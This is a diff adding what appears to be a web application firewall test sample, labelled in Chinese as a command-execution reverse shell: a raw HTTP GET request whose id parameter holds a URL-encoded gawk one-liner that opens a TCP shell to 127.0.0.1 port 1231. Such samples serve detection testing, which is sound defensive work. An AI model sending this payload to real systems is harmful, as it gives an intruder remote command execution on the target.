@@ -1,0 +1,9 @@
+# 命令执行_反弹shell-06507074
+# gawk反弹shell
+GET /?id=gawk%20%27BEGIN%7Bs=%22%2Finet%2Ftcp%2F0%2F127.0.0.1%2F1231%22%3Bfor%28%3Bs%7C&getline%20c%3Bclose%28c%29%29while%28c%7Cgetline%29print%7C&s%3Bclose%28s%29%7D%27&bid=hd_tag_m8mv25yi HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25yi
+RM-PRO-Token: 0e4157d43c326c261ad22f92d754178d
+RM-PRO-Time: 1742808514229
+User-Agent: curl/7.83.1
+
